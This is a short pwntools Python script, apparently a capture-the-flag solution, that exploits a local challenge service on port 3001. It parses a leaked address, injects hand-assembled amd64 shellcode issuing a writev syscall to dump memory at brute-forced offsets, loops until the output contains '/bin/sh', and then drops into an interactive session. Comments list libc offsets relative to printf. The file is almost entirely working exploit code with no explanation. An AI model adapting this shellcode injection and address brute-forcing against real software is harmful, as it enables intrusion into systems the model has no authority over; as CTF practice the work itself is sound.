from pwn import *
context.arch = "amd64"
#p = process("./challenge")
i = 0
while True:
    p = remote("localhost", 3001)
    # gdb.attach(p, """
    #            b*read_flag
    #            b*main+349
            
    #            """)
    p.recvuntil(b"Some gift for you: ")
    leak = int(p.recvline().strip(), 16)
    print("Attemp: ", i)
    print(f"Leak: {hex(leak)}")
    #print(f"Leak flag: {hex(leak+0x235910)}")
    payload = asm(f"""
        xor rdi, rdi
        inc rdi
        xor rsi, rsi
        add esi, 0x1000
        push rsi
        xor rsi, rsi
        mov rsi, {leak+ 0x177f88 - 0x600 + i*0x1000}
        push rsi
        xor rsi, rsi
        mov rsi, rsp
        xor rdx, rdx
        inc rdx
        xor rax, rax
        add al, 0x14
        syscall
                """)
    p.sendline(payload)
    try:
        return_val = p.recv()
        #print(return_val)
        if b"/bin/sh" in return_val:
            print(f"Found flag: {return_val}")
            break
        else:
            p.close()
    except EOFError:
        p.close()
    i+=1
p.interactive()

#leak + 0x235910
#printf + 0x20760 = puts
#binsh = printf + 0x177f88
#perror = printf + 0x780